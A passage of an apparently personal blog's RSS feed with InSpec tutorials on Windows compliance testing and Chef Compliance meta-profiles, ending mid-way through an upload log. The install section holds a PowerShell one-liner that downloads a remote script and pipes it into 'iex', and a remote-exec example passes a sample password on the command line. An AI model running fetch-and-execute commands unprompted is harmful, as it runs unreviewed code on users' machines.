&lt;li&gt;&lt;a href=&quot;https://www.inspec.io/docs/reference/resources/docker/&quot;&gt;InSpec docker resource&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.inspec.io/docs/reference/resources/docker_container/&quot;&gt;InSpec docker_container resource&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.inspec.io/docs/reference/resources/docker_image/&quot;&gt;InSpec docker_image resource&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/dev-sec/cis-docker-benchmark&quot;&gt;DevSec CIS Docker Benchmark Implementation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf&quot;&gt;CIS Docker Benchmark PDF&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/chef/inspec/pull/1566&quot;&gt;Docker Pull Request Resource&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Windows Infrastructure Testing and Compliance with InSpec</title>
      <link>http://lollyrock.com/articles/inspec-windows/</link>
      <pubDate>Sun, 09 Apr 2017 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/inspec-windows/</guid>
      <author></author>
      <description>&lt;p&gt;InSpec is an infrastructure testing and compliance tool that allows you to write re-usable tests for your IT components. InSpec tests can easily be used in development and production environments to shift &lt;a href=&quot;https://blog.chef.io/2016/09/26/shift-left-security-and-compliance-automation-with-inspec-and-chef/&quot;&gt;Compliance left&lt;/a&gt;. This blog post will highlight how you can leverage InSpec on Windows.&lt;/p&gt;
&lt;h2 id=&quot;install-inspec-on-windows&quot;&gt;Install InSpec on Windows&lt;/h2&gt;
&lt;p&gt;First things first: We need InSpec on our workstation. There are two packages that offer an easy way to get started. For production and standalone environments, I recommend the InSpec package. Alternatively there is ChefDK, if you need Chef + Test-Kitchen + InSpec. You can download both packages from &lt;a href=&quot;https://downloads.chef.io/&quot;&gt;https://downloads.chef.io/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Another option is to install InSpec via a Powershell script:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;. { iwr -useb https://omnitruck.chef.io/install.ps1 } | iex; install -project inspec
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once InSpec is installed, run &lt;code&gt;inspec version&lt;/code&gt; to verify that the installation was successful.&lt;/p&gt;
&lt;h2 id=&quot;write-your-first-test&quot;&gt;Write your first test&lt;/h2&gt;
&lt;p&gt;In my case, I am going to use &lt;a href=&quot;https://code.visualstudio.com/&quot;&gt;Visual Studio Code&lt;/a&gt; to write the InSpec test. Open Powershell and create a new directory:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-ruby&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# create a directory for the test&lt;/span&gt;
md inspec
cd .\inspec
&lt;span class=&quot;comment&quot;&gt;# open Visual Studio Code&lt;/span&gt;
code .
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/articles/inspec-windows/inspec-create-dir.png&quot; alt=&quot;Create new directory for InSpec tests&quot; title=&quot;Create new directory for InSpec tests&quot;&gt;&lt;/p&gt;
&lt;p&gt;Now, create a new file in Visual Studio Code and write down the first InSpec test:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-ruby&quot;&gt;describe service(&lt;span class=&quot;string&quot;&gt;'DHCP Client'&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt;
  it { should be_installed }
  it { should be_running }
&lt;span class=&quot;keyword&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This is all we need to test if the &lt;code&gt;DHCP Client&lt;/code&gt; service is installed and running. Save the file and let’s execute the test.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/articles/inspec-windows/vscode-test.png&quot; alt=&quot;Write InSpec tests in VSCode&quot; title=&quot;Write InSpec tests in VSCode&quot;&gt;&lt;/p&gt;
&lt;p&gt;Execute InSpec from Powershell:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;inspec &lt;span class=&quot;built_in&quot;&gt;exec&lt;/span&gt; .\test.rb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/articles/inspec-windows/inspec-exec-test.png&quot; alt=&quot;Execute InSpec test&quot; title=&quot;Execute InSpec test&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;run-inspec-tests-against-a-remote-windows-machine&quot;&gt;Run InSpec tests against a remote Windows machine&lt;/h2&gt;
&lt;p&gt;I passed the &lt;code&gt;hello world&lt;/code&gt; of InSpec by running the first test on our workstation. As a next step, we run the same test against a remote Windows 2012 R2 server. We will use the same InSpec command with additional target information:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;inspec &lt;span class=&quot;built_in&quot;&gt;exec&lt;/span&gt; test.rb -t winrm://Administarator@hostname -p &lt;span class=&quot;string&quot;&gt;'P@ssword'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/articles/inspec-windows/inspec-exec-remote.png&quot; alt=&quot;Execute InSpec test remotely&quot; title=&quot;Execute InSpec test remotely&quot;&gt;&lt;/p&gt;
&lt;p&gt;With a few commands, we executed an InSpec test against a local workstation and a remote server.&lt;/p&gt;
&lt;h2 id=&quot;resources-for-windows&quot;&gt;Resources for Windows&lt;/h2&gt;
&lt;p&gt;Above, we explained how an InSpec test is created and executed. To make this experience great, InSpec ships with a number of resources optimized for Windows environments. Those resources range from core operating system essentials to application components.&lt;/p&gt;
&lt;p&gt;Verify Windows settings and configuration:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://inspec.io/docs/reference/resources/file/&quot;&gt;file&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://inspec.io/docs/reference/resources/package/&quot;&gt;package&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://inspec.io/docs/reference/resources/port/&quot;&gt;port&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://inspec.io/docs/reference/resources/registry_key/&quot;&gt;registry_key&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://inspec.io/docs/reference/resources/service/&quot;&gt;service&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://inspec.io/docs/reference/resources/user/&quot;&gt;user&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://inspec.io/docs/reference/resources/users/&quot;&gt;users&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://inspec.io/docs/reference/resources/windows_feature/&quot;&gt;windows_feature&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://inspec.io/docs/reference/resources/windows_task/&quot;&gt;windows_task&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://inspec.io/docs/reference/resources/wmi/&quot;&gt;wmi&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Audit Windows security settings:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://inspec.io/docs/reference/resources/audit_policy/&quot;&gt;audit_policy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://inspec.io/docs/reference/resources/security_policy/&quot;&gt;security_policy&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Run custom scripts:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://inspec.io/docs/reference/resources/powershell/&quot;&gt;powershell&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://inspec.io/docs/reference/resources/vbscript/&quot;&gt;vbscript&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Verify IIS configuration:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://inspec.io/docs/reference/resources/iis_site/&quot;&gt;iis_site&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;More resources are available and documented at &lt;a href=&quot;http://inspec.io/docs/reference/resources/&quot;&gt;InSpec Docs&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;verify-configuration-of-the-windows-operating-system&quot;&gt;Verify configuration of the Windows operating system&lt;/h2&gt;
&lt;p&gt;The following example illustrate the use of the &lt;code&gt;file&lt;/code&gt;, &lt;code&gt;user&lt;/code&gt;, &lt;code&gt;users&lt;/code&gt;, &lt;code&gt;package&lt;/code&gt; and &lt;code&gt;windows_taks&lt;/code&gt; resource.&lt;/p&gt;
&lt;script src=&quot;https://gist.github.com/chris-rock/3ab57d7d1bb3d1b813f614f81dcfafbf.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;The result on my Windows 10 workstation will return:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/articles/inspec-windows/test-win.png&quot; alt=&quot;Run InSpec operating system checks&quot; title=&quot;Run InSpec operating system checks&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;security-checks-for-windows&quot;&gt;Security checks for Windows&lt;/h2&gt;
&lt;p&gt;If you are interested in operating system hardening for Windows, you need to be able to verify &lt;code&gt;registry_key&lt;/code&gt;, &lt;code&gt;security_policy&lt;/code&gt; or &lt;code&gt;audit_policy&lt;/code&gt;.&lt;/p&gt;
&lt;script src=&quot;https://gist.github.com/chris-rock/7269ebfbff4f2500e59f922aa9d598fa.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;Have a look at &lt;a href=&quot;https://technet.microsoft.com/en-us/library/jj966254.aspx&quot;&gt;Administer Security Policy Settings&lt;/a&gt;,&lt;a href=&quot;https://technet.microsoft.com/en-us/library/dn221963.aspx&quot;&gt;User Rights Assignment&lt;/a&gt;, &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/bb530716.aspx&quot;&gt;Privilege Constants&lt;/a&gt; and &lt;a href=&quot;https://technet.microsoft.com/en-us/library/cc766468.aspx&quot;&gt;Audit Policy&lt;/a&gt; to learn more about possible settings.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/articles/inspec-windows/test-sec.png&quot; alt=&quot;Run security checks&quot; title=&quot;Run security checks&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;reuse-existing-powershell-or-vbscript-in-inspec&quot;&gt;Reuse existing Powershell or VBScript in InSpec&lt;/h2&gt;
&lt;p&gt;InSpec also supports running Powershell and VBScript. This allows you to re-use existing scripts inside InSpec. &lt;code&gt;powershell&lt;/code&gt; and &lt;code&gt;vbscript&lt;/code&gt; resources provide the required capabilities to embed scripts in InSpec.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-ruby&quot;&gt;script = &amp;lt;&amp;lt;-EOH
  Write-Output &lt;span class=&quot;string&quot;&gt;'hello'&lt;/span&gt;
EOH

describe powershell(script) &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt;
  its(&lt;span class=&quot;string&quot;&gt;'stdout'&lt;/span&gt;) { should eq &lt;span class=&quot;string&quot;&gt;&quot;hello\r\n&quot;&lt;/span&gt; }
  its(&lt;span class=&quot;string&quot;&gt;'stderr'&lt;/span&gt;) { should eq &lt;span class=&quot;string&quot;&gt;''&lt;/span&gt; }
&lt;span class=&quot;keyword&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Besides Powershell, InSpec supports &lt;code&gt;vbscript&lt;/code&gt;, too:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-ruby&quot;&gt;script = &amp;lt;&amp;lt;-EOH
  WScript.Echo &lt;span class=&quot;string&quot;&gt;&quot;hello&quot;&lt;/span&gt;
EOH

describe vbscript(script) &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt;
  its(&lt;span class=&quot;string&quot;&gt;'stdout'&lt;/span&gt;) { should eq &lt;span class=&quot;string&quot;&gt;&quot;hello\r\n&quot;&lt;/span&gt; }
&lt;span class=&quot;keyword&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;application-testing-with-inspec&quot;&gt;Application testing with InSpec&lt;/h2&gt;
&lt;p&gt;In addition to operating system checks, we can test IIS configurations with InSpec as well. The following example demonstrates tests for an out-of-the-box IIS server.&lt;/p&gt;
&lt;script src=&quot;https://gist.github.com/chris-rock/a079adf369c88ac671b2b0f96f9bb229.js&quot;&gt;&lt;/script&gt;

&lt;h2 id=&quot;compliance&quot;&gt;Compliance&lt;/h2&gt;
&lt;p&gt;Above, we introduced InSpec as an infrastructure testing tool. For compliance, &lt;a href=&quot;http://inspec.io/docs/reference/dsl_inspec/&quot;&gt;additional metadata&lt;/a&gt; can be attached around &lt;code&gt;describe&lt;/code&gt; tests. The following example shows the use of criticality (&lt;code&gt;impact&lt;/code&gt;), &lt;code&gt;title&lt;/code&gt;, tags (&lt;code&gt;tag&lt;/code&gt;) and references (&lt;code&gt;ref&lt;/code&gt;).&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-ruby&quot;&gt;control &lt;span class=&quot;string&quot;&gt;'windows-base-102'&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt;
  impact &lt;span class=&quot;number&quot;&gt;1.0&lt;/span&gt;
  title &lt;span class=&quot;string&quot;&gt;'Anonymous Access to Windows Shares and Named Pipes is Disallowed'&lt;/span&gt;
  tag &lt;span class=&quot;symbol&quot;&gt;cis:&lt;/span&gt; [&lt;span class=&quot;string&quot;&gt;'windows_2012r2:2.3.11.8'&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;'windows_2016:2.3.10.9'&lt;/span&gt;]
  ref &lt;span class=&quot;string&quot;&gt;'CIS Microsoft Windows Server 2012 R2 Benchmark'&lt;/span&gt;
  ref &lt;span class=&quot;string&quot;&gt;'CIS Microsoft Windows Server 2016 RTM (Release 1607) Benchmark'&lt;/span&gt;
  describe registry_key(&lt;span class=&quot;string&quot;&gt;'HKLM\System\CurrentControlSet\Services\LanManServer\Parameters'&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt;
    it { should exist }
    its(&lt;span class=&quot;string&quot;&gt;'RestrictNullSessAccess'&lt;/span&gt;) { should eq &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; }
  &lt;span class=&quot;keyword&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;keyword&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In most cases, you do not want to start from scratch to develop compliance benchmarks. The &lt;a href=&quot;http://dev-sec.io/&quot;&gt;DevSec.io&lt;/a&gt; project already provides industry best-practices for Linux and Windows operating systems. The Windows benchmark is currently in development and contributions are welcome to cover more areas. Let’s run the DevSec Windows Baseline quickly:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-ruby&quot;&gt;inspec exec &lt;span class=&quot;symbol&quot;&gt;https:&lt;/span&gt;/&lt;span class=&quot;regexp&quot;&gt;/github.com/dev&lt;/span&gt;-sec/windows-baseline
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Are you compliant?&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/articles/inspec-windows/test-devsec.png&quot; alt=&quot;Run DevSec Windows Baseline&quot; title=&quot;Run DevSec Windows Baseline&quot;&gt;&lt;/p&gt;
&lt;p&gt;I recommend you have a look at the following DevSec profiles:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/dev-sec/windows-baseline&quot;&gt;DevSec Windows Baseline&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/dev-sec/windows-patch-baseline&quot;&gt;DevSec Windows Patch Baseline&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Those benchmark already support Windows 2012+, Windows 2016 and Windows Nano.&lt;/p&gt;
&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;This blog post covered the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;InSpec installation on Windows&lt;/li&gt;
&lt;li&gt;InSpec resources for Windows&lt;/li&gt;
&lt;li&gt;Execute InSpec tests locally and remotely&lt;/li&gt;
&lt;li&gt;InSpec Compliance profiles for Windows&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You should be prepared to start your first tests with InSpec in your own environment. If you feel that something is missing, please let me know.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Using meta-profiles with Chef Compliance</title>
      <link>http://lollyrock.com/articles/chef-compliance-meta-profiles/</link>
      <pubDate>Mon, 05 Dec 2016 18:00:00 -0600</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/chef-compliance-meta-profiles/</guid>
      <author></author>
      <description>&lt;p&gt;This article demonstrates InSpec’s meta profile functionality in combination with Chef Compliance. This feature enables you to write profile overlays and to reuse controls from existing profiles. This is a great way to manage deviations of out-of-the-box profiles shipped with Chef Compliance.&lt;/p&gt;
&lt;h2 id=&quot;meta-profiles&quot;&gt;Meta Profiles&lt;/h2&gt;
&lt;p&gt;A meta profile is an overlay or a collection of multiple profiles. Examples are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;a deviation from CIS benchmarks&lt;/li&gt;
&lt;li&gt;collection of all CIS profiles that apply to your infrastructure (eg. a company-wide profile)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The structure of a meta profile (e.g. &lt;a href=&quot;https://github.com/chris-rock/acme-inspec-profile&quot;&gt;Acme InSpec profile&lt;/a&gt;) is identical to any other InSpec profile:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tree acme-inspec-profile
acme-inspec-profile
├── LICENSE
├── README.md
├── controls
│   ├── hardening.rb
│   ├── patch.rb
│   └── ssl.rb
└── inspec.yml
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;InSpec &lt;code&gt;dependencies&lt;/code&gt; are defined in &lt;code&gt;inspec.yml&lt;/code&gt; via &lt;code&gt;depends&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cat acme-inspec-profile/inspec.yml
name: acme-inspec-profile
title: Meta profile for Acme Inc
maintainer: Christoph Hartmann
copyright: Christoph Hartmann
copyright_email: chris@lollyrock.com
license: Apache 2.0
summary: This profile collects all compliance and security related requirements for Acme Inc.
version: 0.1.0
depends:
  - name: linux-patch-benchmark
    git: https://github.com/dev-sec/linux-patch-benchmark.git
  - name: windows-patch-benchmark
    git: https://github.com/dev-sec/windows-patch-benchmark.git
  - name: os-hardening
    git: https://github.com/dev-sec/tests-os-hardening.git
  - name: ssh-hardening
    git: https://github.com/dev-sec/tests-ssh-hardening.git
  - name: ssl-benchmark
    git: https://github.com/dev-sec/ssl-benchmark.git
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In addition to &lt;code&gt;git&lt;/code&gt; dependencies, InSpec supports &lt;code&gt;supermarket&lt;/code&gt;, &lt;code&gt;url&lt;/code&gt; and &lt;code&gt;compliance&lt;/code&gt; dependencies as profile locations as well:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;depends:
  # defaults to supermarket
  - name: hardening/ssh-hardening  
  # remote tar or zip file
  - name: os-hardening
    url: https://github.com/dev-sec/tests-os-hardening/archive/master.zip
  # git
  - git: https://github.com/dev-sec/ssl-benchmark.git
  - name: windows-patch-benchmark
    git: https://github.com/chris-rock/windows-patch-benchmark.git
  # Chef Compliance / Chef Automate
  - name: linux
    compliance: base/linux
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once you depend on another profile, you can leverage all its controls in your meta profile. Additionally all custom InSpec resources are available as well, in case you want to define new controls.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cat acme-inspec-profile/controls/hardening.rb
# encoding: utf-8
#
# Licensed under the Apache License, Version 2.0 (the &amp;quot;License&amp;quot;);
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an &amp;quot;AS IS&amp;quot; BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# author: Christoph Hartmann
# author: Dominik Richter

# ensure linux servers are hardenend
include_controls &amp;#39;os-hardening&amp;#39;
include_controls &amp;#39;ssh-hardening&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;InSpec provides &lt;code&gt;include_controls&lt;/code&gt; and &lt;code&gt;require_controls&lt;/code&gt; keywords to load controls from inherited profiles. By default, no controls are executed after you defined its dependency in &lt;code&gt;inspec.yml&lt;/code&gt;. The parameter for &lt;code&gt;include_controls&lt;/code&gt; eg. &lt;code&gt;os-hardening&lt;/code&gt; matches the name in &lt;code&gt;inspec.yml&lt;/code&gt;. In that specific case, we just import all controls from our dependency. Further documentation about this behavior   available at &lt;a href=&quot;http://inspec.io/docs/reference/profiles/&quot;&gt;InSpec Docs&lt;/a&gt;. The dependency management functionality is specified in &lt;a href=&quot;https://github.com/chef/inspec/issues/888&quot;&gt;RFC Dependencies&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;vendoring&quot;&gt;Vendoring&lt;/h2&gt;
&lt;p&gt;While InSpec allows runtime resolution of dependencies, customers want to ensure safety for their production environment. Some challenges I have seen very often:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;no internet is available in air-gapped environments&lt;/li&gt;
&lt;li&gt;new profile updates need to be tested before they are used in production&lt;/li&gt;
&lt;li&gt;integration in CI/CD pipelines&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In order to help with those challenges, the InSpec team decided to establish a vendoring mechanism for profiles. This process is defined in &lt;a href=&quot;https://github.com/chef/inspec/issues/1283&quot;&gt;Vendor dependent profiles in archive&lt;/a&gt; and is composed of two steps:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;resolve all dependencies and their versions&lt;/li&gt;
&lt;li&gt;download all dependencies into &lt;code&gt;vendor&lt;/code&gt; directory&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Once those steps are finalized, an InSpec profile can be executed standalone without any internet connection available during runtime. Chef Compliance and Chef Automate prefer that approach over runtime profile resolution.&lt;/p&gt;
&lt;p&gt;The lockfile &lt;code&gt;inspec.lock&lt;/code&gt; looks similar to &lt;code&gt;inspec.yml&lt;/code&gt;, but describes all version constraints.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cat acme-inspec-profile/inspec.lock
---
lockfile_version: 1
depends:
- name: linux-patch-benchmark
  resolved_source:
    git: https://github.com/dev-sec/linux-patch-benchmark.git
    ref: d53030317b711f36fa2fde9e18170ce6b4eaacf2
  version_constraints: &amp;quot;&amp;gt;= 0&amp;quot;
- name: windows-patch-benchmark
  resolved_source:
    git: https://github.com/dev-sec/windows-patch-benchmark.git
    ref: c183d08eb25638e7f5eac97e521640ea314c8e3d
  version_constraints: &amp;quot;&amp;gt;= 0&amp;quot;
- name: os-hardening
  resolved_source:
    git: https://github.com/dev-sec/tests-os-hardening.git
    ref: da3a1b6ce8a845d6818152a824e123c2445c355f
  version_constraints: &amp;quot;&amp;gt;= 0&amp;quot;
- name: ssh-hardening
  resolved_source:
    git: https://github.com/dev-sec/tests-ssh-hardening.git
    ref: 75754b9b3fe45c601f0fa0036b01c61c8b8e26d9
  version_constraints: &amp;quot;&amp;gt;= 0&amp;quot;
- name: ssl-benchmark
  resolved_source:
    git: https://github.com/dev-sec/ssl-benchmark.git
    ref: e17486c864434c818f96ca13edd2c5a420100a45
  version_constraints: &amp;quot;&amp;gt;= 0&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;All dependencies are downloaded and stored in &lt;code&gt;vendor&lt;/code&gt; directory.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tree acme-inspec-profile
acme-inspec-profile
├── LICENSE
├── README.md
├── controls
│   ├── hardening.rb
│   ├── patch.rb
│   └── ssl.rb
├── inspec.lock
├── inspec.yml
└── vendor
    ├── 75754b9b3fe45c601f0fa0036b01c61c8b8e26d9
    │   ├── CHANGELOG.md
    │   ├── Gemfile
    │   ├── README.md
    │   ├── Rakefile
    │   ├── controls
    │   │   ├── ssh_spec.rb
    │   │   └── sshd_spec.rb
    │   ├── inspec.yml
    │   └── libraries
    │       └── ssh_crypto.rb
    ├── c183d08eb25638e7f5eac97e521640ea314c8e3d
    │   ├── CONTRIBUTING.md
    │   ├── ChefCompliance.png
    │   ├── InSpec+Update.png
    │   ├── LICENSE
    │   ├── README.md
    │   ├── Windows+Update.png
    │   ├── controls
    │   │   └── patches.rb
    │   ├── inspec.yml
    │   └── libraries
    │       └── windows_updates.rb
    ├── d53030317b711f36fa2fde9e18170ce6b4eaacf2
    │   ├── CentOS+Patch.png
    │   ├── Gemfile
    │   ├── LICENSE
    │   ├── README.md
    │   ├── Rakefile
    │   ├── controls
    │   │   └── patches.rb
    │   ├── inspec.yml
    │   └── libraries
    │       └── linux_updates.rb
    ├── da3a1b6ce8a845d6818152a824e123c2445c355f
    │   ├── CHANGELOG.md
    │   ├── Gemfile
    │   ├── README.md
    │   ├── Rakefile
    │   ├── controls
    │   │   ├── os_spec.rb
    │   │   ├── package_spec.rb
    │   │   └── sysctl_spec.rb
    │   └── inspec.yml
    └── e17486c864434c818f96ca13edd2c5a420100a45
        ├── README.md
        ├── controls
        │   └── ssl_test.rb
        └── inspec.yml

15 directories, 43 files
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;execute-a-meta-profile-with-chef-compliance&quot;&gt;Execute a meta profile with Chef Compliance&lt;/h2&gt;
&lt;p&gt;In order to run meta profiles we need at least &lt;a href=&quot;https://discourse.chef.io/t/chef-compliance-1-7-3-inspec-1-7-1/9985&quot;&gt;Chef Compliance 1.7.3&lt;/a&gt;. Next, just clone the  &lt;a href=&quot;https://github.com/chris-rock/acme-inspec-profile&quot;&gt;Acme InSpec profile&lt;/a&gt; via &lt;code&gt;git clone https://github.com/chris-rock/acme-inspec-profile&lt;/code&gt;. We have two options to upload the profile to Chef Compliance:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Upload via InSpec CLI&lt;/li&gt;
&lt;li&gt;Upload of archive via Chef Compliance Web UI&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first is the easiest since everything is done for you with one command.&lt;/p&gt;
&lt;h3 id=&quot;upload-via-inspec-cli&quot;&gt;Upload via InSpec CLI&lt;/h3&gt;
&lt;p&gt;First, you need to login to Chef Compliance. You find your login token in Chef Compliance via the about dialog.&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;img src=&quot;/articles/chef-compliance-meta-profiles/cc-token-fs8.png&quot; alt=&quot;Copy the token from Chef Compliance&quot; title=&quot;Access Token in Chef Compliance&quot; width=&quot;700px&quot;&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;Use that token to login via InSpec CLI:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ inspec compliance login https://compliance.test --insecure --user=&amp;#39;admin&amp;#39; --token=&amp;#39;eyJh....Jlqg&amp;#39;

API access token stored

$ git clone https://github.com/chris-rock/acme-inspec-profile
Cloning into &amp;#39;acme-inspec-profile&amp;#39;...
remote: Counting objects: 12, done.
remote: Total 12 (delta 0), reused 0 (delta 0), pack-reused 12
Unpacking objects: 100% (12/12), done.
Checking connectivity... done.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once you are logged in, you use the &lt;code&gt;compliance upload&lt;/code&gt; command to package and upload the &lt;code&gt;acme-inspec-profile&lt;/code&gt; profile for Chef Compliance.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ inspec compliance upload acme-inspec-profile            
Vendor dependencies of acme-inspec-profile into acme-inspec-profile/vendor
I, [2016-12-06T10:24:43.899931 #90853]  INFO -- : Checking profile in acme-inspec-profile
I, [2016-12-06T10:24:43.900029 #90853]  INFO -- : Metadata OK.
`command(ssh).exist?` is not suported on your OS:
I, [2016-12-06T10:24:44.070233 #90853]  INFO -- : Found 120 controls.
W, [2016-12-06T10:24:44.070519 #90853]  WARN -- : Control verify-kb has no description
W, [2016-12-06T10:24:44.070555 #90853]  WARN -- : Control important-count has no description
W, [2016-12-06T10:24:44.070571 #90853]  WARN -- : Control important-patches has no description
W, [2016-12-06T10:24:44.070581 #90853]  WARN -- : Control important-patches has no tests defined
W, [2016-12-06T10:24:44.070591 #90853]  WARN -- : Control optional-count has no description
W, [2016-12-06T10:24:44.070601 #90853]  WARN -- : Control optional-patches has no description
W, [2016-12-06T10:24:44.070610 #90853]  WARN -- : Control optional-patches has no tests defined
W, [2016-12-06T10:24:44.070619 #90853]  WARN -- : Control verify-patches has no description
W, [2016-12-06T10:24:44.070629 #90853]  WARN -- : Control patches has no description
W, [2016-12-06T10:24:44.070638 #90853]  WARN -- : Control patches has no tests defined
Profile is valid
Generate temporary profile archive at /var/folders/jy/2bnrfb4s36jbjtzllvhhyqhw0000gn/T/acme-inspec-profile20161206-90853-kzpo1p.tar.gz
I, [2016-12-06T10:24:44.088457 #90853]  INFO -- : Generate archive /var/folders/jy/2bnrfb4s36jbjtzllvhhyqhw0000gn/T/acme-inspec-profile20161206-90853-kzpo1p.tar.gz.
